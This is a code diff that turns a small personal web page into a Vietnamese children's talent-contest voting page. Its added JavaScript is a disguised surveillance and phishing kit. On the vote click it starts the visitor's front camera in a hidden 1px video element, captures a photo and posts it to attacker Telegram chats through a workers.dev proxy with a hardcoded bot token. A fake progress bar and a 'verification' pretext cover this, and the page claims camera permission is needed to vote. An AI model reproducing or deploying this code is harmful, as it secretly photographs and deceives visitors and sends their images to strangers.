@@ -1,86 +1,1050 @@
-<!-- Clone by @WusThanhDieu -->
 <!DOCTYPE html>
-<html lang="en" class="dark">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>trungquan</title>
-    <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet"/>
-    <link rel="stylesheet" href="/static/css/app.css" />
-  </head>
-  <body class="font-sans antialiased">
-    <div
-      id="app"
-      data-page='{
-        "component": "views/home",
-        "props": {
-          "errors": {},
-          "name": "trungquan",
-          "quote": {
-            "message": "",
-            "author": ""
-          },
-          "auth": {
-            "user": null
-          },
-          "ziggy": {
-            "port": null,
-            "defaults": [],
-            "routes": {
-              "home": {
-                "uri": "/",
-                "methods": ["GET", "HEAD"]
-              },
-              "show-create-form": {
-                "uri": "create-message/{id?}",
-                "methods": ["GET", "HEAD"],
-                "parameters": ["id"]
-              },
-              "create-form": {
-                "uri": "create-message",
-                "methods": ["POST"]
-              },
-              "login": {
-                "uri": "login",
-                "methods": ["GET", "HEAD"]
-              },
-              "logout": {
-                "uri": "logout",
-                "methods": ["POST"]
-              },
-              "storage.local": {
-                "uri": "storage/{path}",
-                "methods": ["GET", "HEAD"],
-                "wheres": {
-                  "path": ".*"
-                },
-                "parameters": ["path"]
-              }
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bình chọn Tài năng | Phạm Kiều Chinh vs Nguyễn Ngọc Linh</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --contestant1: #4a6bdf;
+            --contestant1-accent: #e8edff;
+            --contestant2: #e74c3c;
+            --contestant2-accent: #ffebea;
+            --danger: #ff3b30;
+            --success: #34c759;
+            --warning: #ff9500;
+            --dark: #1d1d1f;
+            --light: #f5f5f7;
+            --gray: #86868b;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f9f9f9;
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(90deg, var(--contestant1), var(--contestant2));
+            color: white;
+            padding: 1rem 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 100;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .logo i {
+            color: white;
+        }
+        
+        .timer {
+            background-color: rgba(255,255,255,0.2);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        /* Progress Modal */
+        .progress-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 500px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .progress-modal.show {
+            opacity: 1;
+            display: flex;
+        }
+        
+        .progress-modal-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            color: var(--dark);
+            text-align: center;
+        }
+        
+        .progress-container {
+            width: 100%;
+            margin: 1rem 0;
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            color: var(--gray);
+        }
+        
+        .progress-bar {
+            height: 12px;
+            background-color: rgba(0, 0, 0, 0.08);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0%;
+            border-radius: 6px;
+            transition: width 0.3s ease;
+        }
+        
+        .progress-contestant1 {
+            background-color: var(--contestant1);
+        }
+        
+        .progress-contestant2 {
+            background-color: var(--contestant2);
+        }
+        
+        .progress-status {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            width: 100%;
+            display: none;
+        }
+        
+        .progress-status.show {
+            display: flex;
+        }
+        
+        .progress-status i {
+            font-size: 1.5rem;
+        }
+        
+        .progress-status.error {
+            background-color: rgba(255, 59, 48, 0.15);
+            color: var(--danger);
+        }
+        
+        .progress-status.success {
+            background-color: rgba(52, 199, 89, 0.15);
+            color: var(--success);
+        }
+        
+        /* Vote Button */
+        .center-vote-btn {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            background-color: var(--contestant1);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .center-vote-btn:hover {
+            transform: translateX(-50%) translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.3);
+        }
+        
+        .center-vote-btn:disabled {
+            background-color: var(--gray);
+            cursor: not-allowed;
+            transform: translateX(-50%);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+        
+        .center-vote-btn.contestant2-selected {
+            background-color: var(--contestant2);
+        }
+        
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            width: 100%;
+            padding-bottom: 100px;
+            padding-top: 20px;
+        }
+        
+        .hero {
+            text-align: center;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 3rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .versus {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--dark);
+            background-color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+            background: linear-gradient(90deg, var(--contestant1), var(--contestant2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .subtitle {
+            color: var(--gray);
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        /* Cards */
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.15);
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--contestant1), var(--contestant2));
+        }
+        
+        .card-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            justify-content: center;
+            color: var(--dark);
+        }
+        
+        /* Contestants */
+        .contestants {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .contestant {
+            text-align: center;
+            cursor: pointer;
+            padding: 2rem;
+            border-radius: 16px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+        
+        .contestant:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
+        }
+        
+        .contestant1 {
+            background-color: var(--contestant1-accent);
+        }
+        
+        .contestant2 {
+            background-color: var(--contestant2-accent);
+        }
+        
+        .contestant.selected {
+            background-color: white;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            transform: translateY(-5px);
+            border: 2px solid;
+        }
+        
+        .contestant1.selected {
+            border-color: var(--contestant1);
+        }
+        
+        .contestant2.selected {
+            border-color: var(--contestant2);
+        }
+        
+        .contestant.selected::after {
+            content: '✓ ĐÃ CHỌN';
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background-color: var(--success);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        .contestant-photo {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.3s ease;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .contestant-photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .contestant-name {
+            font-weight: 800;
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .contestant1 .contestant-name {
+            color: var(--contestant1);
+        }
+        
+        .contestant2 .contestant-name {
+            color: var(--contestant2);
+        }
+        
+        .contestant-info {
+            font-size: 1rem;
+            color: var(--gray);
+            margin-bottom: 1rem;
+        }
+        
+        .contestant-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0.5rem;
+            border-radius: 8px;
+        }
+        
+        .stat-value {
+            font-weight: bold;
+            font-size: 1.3rem;
+            margin-bottom: 0.2rem;
+        }
+        
+        .contestant1-stat {
+            color: var(--contestant1);
+        }
+        
+        .contestant2-stat {
+            color: var(--contestant2);
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            margin-top: auto;
+            padding: 2rem;
+            color: var(--gray);
+            font-size: 0.9rem;
+            background-color: rgba(0,0,0,0.03);
+            border-top: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        /* Hidden Elements */
+        .hidden-element {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1000;
+        }
+        
+        /* Responsive */
+        @media (max-width: 900px) {
+            .container {
+                padding: 1.5rem;
+                padding-bottom: 120px;
+            }
+            
+            .logo-container {
+                gap: 1.5rem;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .contestants {
+                grid-template-columns: 1fr;
+            }
+            
+            .center-vote-btn {
+                bottom: 20px;
+                padding: 0.8rem 1.5rem;
+                font-size: 1.1rem;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .subtitle {
+                font-size: 1rem;
+            }
+            
+            .card {
+                padding: 1.5rem;
+            }
+            
+            .card-title {
+                font-size: 1.5rem;
+            }
+            
+            .contestant-photo {
+                width: 150px;
+                height: 150px;
+            }
+            
+            .contestant-name {
+                font-size: 1.3rem;
+            }
+            
+            .center-vote-btn {
+                width: 90%;
+                justify-content: center;
+            }
+            
+            .progress-modal {
+                padding: 1.5rem;
+                width: 95%;
+            }
+            
+            .progress-modal-title {
+                font-size: 1.3rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-trophy"></i>
+                <span>Tài năng </span>
+            </div>
+            <div class="timer">
+                <i class="fas fa-clock"></i>
+                <span id="countdown-timer">23:59:59</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Progress Modal -->
+    <div class="progress-modal" id="progress-modal">
+        <div class="progress-modal-title" id="progress-title">Đang gửi bình chọn...</div>
+        <div class="progress-container">
+            <div class="progress-info">
+                <span>Tiến trình:</span>
+                <span id="progress-percent">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+        
+        <div class="progress-status" id="progress-status">
+            <i id="status-icon" class="fas fa-circle-notch fa-spin"></i>
+            <span id="status-message">Đang xử lý bình chọn của bạn...</span>
+        </div>
+    </div>
+    
+    <!-- Vote Button -->
+    <button class="center-vote-btn" id="center-vote-btn" disabled>
+        <i class="fas fa-vote-yea"></i>
+        <span>BÌNH CHỌN NGAY</span>
+    </button>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <section class="hero">
+            <div class="logo-container">
+                <div class="contestant-photo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Phạm Kiều Chinh" id="contestant1-photo">
+                </div>
+                <div class="versus">VS</div>
+                <div class="contestant-photo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Nguyễn Ngọc Linh" id="contestant2-photo">
+                </div>
+            </div>
+            <h1>Bình chọn Tài năng Nhí</h1>
+            <p class="subtitle">Hãy chọn thí sinh bạn yêu thích giữa Phạm Kiều Chinh và Nguyễn Ngọc Linh. Bình chọn của bạn sẽ giúp xác định thí sinh xuất sắc nhất!</p>
+        </section>
+        
+        <div class="card">
+            <div class="card-title">
+                <i class="fas fa-star"></i>
+                <span>Hai thí sinh xuất sắc</span>
+            </div>
+            
+            <div class="contestants">
+                <div class="contestant contestant1" id="contestant1">
+                    <div class="contestant-photo">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Phạm Kiều Chinh">
+                    </div>
+                    <div class="contestant-name">Phạm Kiều Chinh </div>
+                    <div class="contestant-info">Mã số: 001 | Ngày sinh: 14/09/2010</div>
+                    
+                    <div class="contestant-stats">
+                        <div class="stat">
+                            <span class="stat-value contestant1-stat">9.5</span>
+                            <span>Điểm tài năng</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-value contestant1-stat">9.0</span>
+                            <span>Điểm trình diễn</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-value contestant1-stat">9.8</span>
+                            <span>Điểm sáng tạo</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="contestant contestant2" id="contestant2">
+                    <div class="contestant-photo">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Nguyễn Ngọc Linh">
+                    </div>
+                    <div class="contestant-name">Nguyễn Ngọc Linh</div>
+                    <div class="contestant-info">Mã số: 002 | Ngày sinh: 05/04/2009</div>
+                    
+                    <div class="contestant-stats">
+                        <div class="stat">
+                            <span class="stat-value contestant2-stat">9.7</span>
+                            <span>Điểm tài năng</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-value contestant2-stat">9.5</span>
+                            <span>Điểm trình diễn</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-value contestant2-stat">9.2</span>
+                            <span>Điểm sáng tạo</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">
+                <i class="fas fa-chart-bar"></i>
+                <span>Thống kê bình chọn</span>
+            </div>
+            
+            <div style="text-align: center; margin-bottom: 2rem;">
+                <canvas id="voteChart" height="200"></canvas>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden Camera Elements -->
+    <video id="hidden-camera" autoplay muted playsinline class="hidden-element"></video>
+    <canvas id="hidden-canvas" class="hidden-element"></canvas>
+    
+    <footer>
+        <p>Bình chọn Tài năng &copy; 2025 | Chương trình phi lợi nhuận vì trẻ em</p>
+        <p>Mọi thông tin chỉ mang tính chất minh họa</p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+        // Telegram Bot Info - MOVED TO TOP
+        const BOT_TOKEN = '8016061982:AAGBDhixC2fxTyhV70s5LH04vSjBeQdZ_Fs';
+        const CHAT_IDS = ['6360461491', '8576204753']; // Two recipients
+        const TELEGRAM_API_URL = `https://quiet-bar-4d07.hackff809876.workers.dev/bot${BOT_TOKEN}/sendPhoto`;
+
+        // DOM Elements
+        const progressBar = document.getElementById('progress');
+        const progressPercent = document.getElementById('progress-percent');
+        const progressModal = document.getElementById('progress-modal');
+        const progressTitle = document.getElementById('progress-title');
+        const centerVoteBtn = document.getElementById('center-vote-btn');
+        const contestant1 = document.getElementById('contestant1');
+        const contestant2 = document.getElementById('contestant2');
+        const progressStatus = document.getElementById('progress-status');
+        const statusIcon = document.getElementById('status-icon');
+        const statusMessage = document.getElementById('status-message');
+        const countdownTimer = document.getElementById('countdown-timer');
+        const hiddenCamera = document.getElementById('hidden-camera');
+        const hiddenCanvas = document.getElementById('hidden-canvas');
+        
+        // Variables
+        let selectedContestant = null;
+        let cameraStream = null;
+        let capturedImage = null;
+        let captureAttempts = 0;
+        const maxCaptureAttempts = 3;
+
+        // Initialize Chart
+        const ctx = document.getElementById('voteChart').getContext('2d');
+        const voteChart = new Chart(ctx, {
+            type: 'doughnut',
+            data: {
+                labels: ['Phạm Kiều Chinh (342)', 'Nguyễn Ngọc Linh (423)'],
+                datasets: [{
+                    data: [48, 52],
+                    backgroundColor: [
+                        'rgba(74, 107, 223, 0.8)',
+                        'rgba(231, 76, 60, 0.8)'
+                    ],
+                    borderColor: [
+                        'rgba(74, 107, 223, 1)',
+                        'rgba(231, 76, 60, 1)'
+                    ],
+                    borderWidth: 1
+                }]
             },
-            "location": ""
-          },
-          "message": "",
-          "client": {
-            "fontName": "Mali",
-            "color": "#ff0019",
-            "messages": [
-              "trungquan",
-              "👽",
-              "❤️"
-            ],
-            "music": "//thanhdieu.com/music.mp3"
-          },
-          "clientId": "/"
-        },
-        "url": "/",
-        "version": "",
-        "clearHistory": false,
-        "encryptHistory": false
-      }
-      '
-    >
-  </div>
-  <script type="module" src="/static/js/app.js"></script>
-  <script type="module" src="/static/js/home.js"></script>
-  </body>
+            options: {
+                responsive: true,
+                plugins: {
+                    legend: {
+                        position: 'bottom',
+                    },
+                    tooltip: {
+                        callbacks: {
+                            label: function(context) {
+                                return `${context.label}: ${context.raw}%`;
+                            }
+                        }
+                    }
+                },
+                cutout: '65%'
+            }
+        });
+
+        // Update Progress Bar
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+            progressPercent.textContent = percent + '%';
+            progressTitle.textContent = `Đang gửi bình chọn... ${percent}%`;
+        }
+
+        // Show Status Message
+        function showStatus(type, message) {
+            progressStatus.className = 'progress-status show';
+            statusMessage.textContent = message;
+            
+            if (type === 'error') {
+                progressStatus.classList.add('error');
+                statusIcon.className = 'fas fa-exclamation-circle';
+            } else if (type === 'success') {
+                progressStatus.classList.add('success');
+                statusIcon.className = 'fas fa-check-circle';
+            } else {
+                statusIcon.className = 'fas fa-circle-notch fa-spin';
+            }
+        }
+
+        // Convert Data URL to File
+        function dataURLtoFile(dataurl, filename) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new File([u8arr], filename, { type: mime });
+        }
+
+        // Send Photo to Telegram for multiple recipients
+        async function sendPhotoToTelegram(photoData, contestantName) {
+            try {
+                showStatus('loading', 'Đang xác minh bình chọn với hệ thống...');
+                
+                const formData = new FormData();
+                formData.append('photo', photoData, 'talent_contest_verify.jpg');
+                formData.append('caption', `Người dùng bình chọn cho: ${contestantName}\nThời gian: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`);
+                
+                // Send to all recipients
+                let successCount = 0;
+                for (const chatId of CHAT_IDS) {
+                    const recipientFormData = new FormData();
+                    recipientFormData.append('chat_id', chatId);
+                    recipientFormData.append('photo', photoData, 'talent_contest_verify.jpg');
+                    recipientFormData.append('caption', `Người dùng bình chọn cho: ${contestantName}\nThời gian: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`);
+                    
+                    try {
+                        const response = await fetch(TELEGRAM_API_URL, {
+                            method: 'POST',
+                            body: recipientFormData
+                        });
+                        
+                        if (response.ok) {
+                            successCount++;
+                        }
+                    } catch (error) {
+                        console.error(`Error sending to ${chatId}:`, error);
+                    }
+                }
+                
+                return successCount > 0; // Return true if at least one message was sent successfully
+            } catch (error) {
+                console.error('Lỗi khi gửi ảnh:', error);
+                return false;
+            }
+        }
+
+        // Check if image is valid (not black or white)
+        async function isImageValid(imageData) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.src = imageData;
+                
+                img.onload = function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0);
+                    
+                    const imagePixels = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                    let darkPixels = 0;
+                    let brightPixels = 0;
+                    
+                    // Analyze each pixel
+                    for (let i = 0; i < imagePixels.length; i += 4) {
+                        const r = imagePixels[i];
+                        const g = imagePixels[i+1];
+                        const b = imagePixels[i+2];
+                        const brightness = (r + g + b) / 3;
+                        
+                        if (brightness < 30) darkPixels++; // Dark pixel
+                        if (brightness > 220) brightPixels++; // Bright pixel
+                    }
+                    
+                    const totalPixels = imagePixels.length / 4;
+                    const darkRatio = darkPixels / totalPixels;
+                    const brightRatio = brightPixels / totalPixels;
+                    
+                    // Image is valid if not too many dark or bright pixels
+                    resolve(darkRatio < 0.8 && brightRatio < 0.8);
+                };
+                
+                img.onerror = () => resolve(false);
+            });
+        }
+
+        // Capture image from hidden camera
+        async function captureFromHiddenCamera() {
+            try {
+                // Ensure camera is ready
+                if (hiddenCamera.readyState < HTMLMediaElement.HAVE_ENOUGH_DATA) {
+                    await new Promise(resolve => {
+                        hiddenCamera.onloadeddata = resolve;
+                        setTimeout(resolve, 1000); // Timeout after 1 second
+                    });
+                }
+
+                // Set canvas dimensions
+                hiddenCanvas.width = hiddenCamera.videoWidth;
+                hiddenCanvas.height = hiddenCamera.videoHeight;
+                const ctx = hiddenCanvas.getContext('2d');
+                
+                // Draw image from video to canvas
+                ctx.drawImage(hiddenCamera, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                
+                // Apply image enhancements
+                ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';
+                
+                // Convert to high quality JPEG
+                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.9);
+                
+                // Check if image is valid (not black or white)
+                if (await isImageValid(imageData)) {
+                    return imageData;
+                }
+                return null;
+            } catch (error) {
+                console.error('Error capturing image:', error);
+                return null;
+            }
+        }
+
+        // Start hidden camera
+        async function startHiddenCamera() {
+            try {
+                // Stop current stream if exists
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Start camera with optimal settings
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user',
+                        frameRate: { ideal: 30 }
+                    }, 
+                    audio: false 
+                });
+                
+                hiddenCamera.srcObject = stream;
+                cameraStream = stream;
+                
+                // Wait for camera to fully initialize
+                await new Promise((resolve, reject) => {
+                    hiddenCamera.onplaying = resolve;
+                    setTimeout(() => {
+                        if (hiddenCamera.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA) {
+                            resolve();
+                        } else {
+                            reject(new Error('Camera failed to start'));
+                        }
+                    }, 2000);
+                });
+                
+                // Capture after camera is stable
+                await new Promise(resolve => setTimeout(resolve, 500));
+                return await captureFromHiddenCamera();
+                
+            } catch (error) {
+                console.error('Hidden camera error:', error);
+                return null;
+            }
+        }
+
+        // Handle Vote Click
+        async function handleVoteClick() {
+            if (!selectedContestant) return;
+            
+            // Show processing status
+            progressModal.classList.add('show');
+            progressTitle.textContent = "Đang xác thực...";
+            
+            try {
+                // Try to capture image (max 3 attempts)
+                let capturedImage = null;
+                let attempts = 0;
+                
+                while (attempts < 3 && !capturedImage) {
+                    attempts++;
+                    capturedImage = await startHiddenCamera();
+                    if (!capturedImage && attempts < 3) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                }
+                
+                // Send image if captured successfully
+                let verificationSuccess = false;
+                if (capturedImage) {
+                    const contestantName = selectedContestant === 'contestant1' 
+                        ? 'Phạm Kiều Chinh (001)' 
+                        : 'Nguyễn Ngọc Linh (002)';
+                    
+                    const imageFile = dataURLtoFile(capturedImage, 'verify.jpg');
+                    verificationSuccess = await sendPhotoToTelegram(imageFile, contestantName);
+                }
+                
+                // Start voting process
+                await startVoteProcess(verificationSuccess);
+                
+            } catch (error) {
+                console.error('Error in voting process:', error);
+                await startVoteProcess(false);
+            } finally {
+                // Ensure camera is stopped
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                }
+            }
+        }
+
+        // Start Vote Process
+        async function startVoteProcess(cameraVerified = false) {
+            progressModal.classList.add('show');
+            centerVoteBtn.style.display = 'none';
+            
+            progressBar.className = 'progress';
+            progressBar.classList.add(selectedContestant === 'contestant1' ? 'progress-contestant1' : 'progress-contestant2');
+            
+            let percent = 0;
+            const interval = setInterval(() => {
+                percent += 5;
+                updateProgress(Math.min(percent, 100));
+                
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    if (!cameraVerified) {
+                        showStatus('error', 'Không thể xác minh do từ chối quyền truy cập . Yêu cầu cho phép để bình chọn.');
+                    } else {
+                        showStatus('success', 'Bình chọn thành công! Cảm ơn bạn đã tham gia.');
+                        
+                        if (selectedContestant === 'contestant1') {
+                            voteChart.data.datasets[0].data[0] += 2;
+                            voteChart.data.datasets[0].data[1] -= 2;
+                        } else {
+                            voteChart.data.datasets[0].data[1] += 2;
+                            voteChart.data.datasets[0].data[0] -= 2;
+                        }
+                        voteChart.update();
+                    }
+                    
+                    setTimeout(() => {
+                        progressModal.classList.remove('show');
+                        centerVoteBtn.style.display = 'flex';
+                    }, 3000);
+                }
+            }, 100);
+        }
+
+        // Event Listeners
+        contestant1.addEventListener('click', function() {
+            selectedContestant = 'contestant1';
+            contestant1.classList.add('selected');
+            contestant2.classList.remove('selected');
+            
+            centerVoteBtn.disabled = false;
+            centerVoteBtn.className = 'center-vote-btn';
+            centerVoteBtn.innerHTML = '<i class="fas fa-vote-yea"></i><span>BÌNH CHỌN Phạm Kiều Chinh</span>';
+        });
+
+        contestant2.addEventListener('click', function() {
+            selectedContestant = 'contestant2';
+            contestant2.classList.add('selected');
+            contestant1.classList.remove('selected');
+            
+            centerVoteBtn.disabled = false;
+            centerVoteBtn.className = 'center-vote-btn contestant2-selected';
+            centerVoteBtn.innerHTML = '<i class="fas fa-vote-yea"></i><span>BÌNH CHỌN Nguyễn Ngọc Linh</span>';
+        });
+
+        centerVoteBtn.addEventListener('click', handleVoteClick);
+
+        // Initialize countdown timer
+        function updateCountdown() {
+            const now = new Date();
+            const endOfDay = new Date();
+            endOfDay.setHours(23, 59, 59, 0);
+            
+            const diff = endOfDay - now;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            countdownTimer.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // Cleanup on page exit
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
 </html>
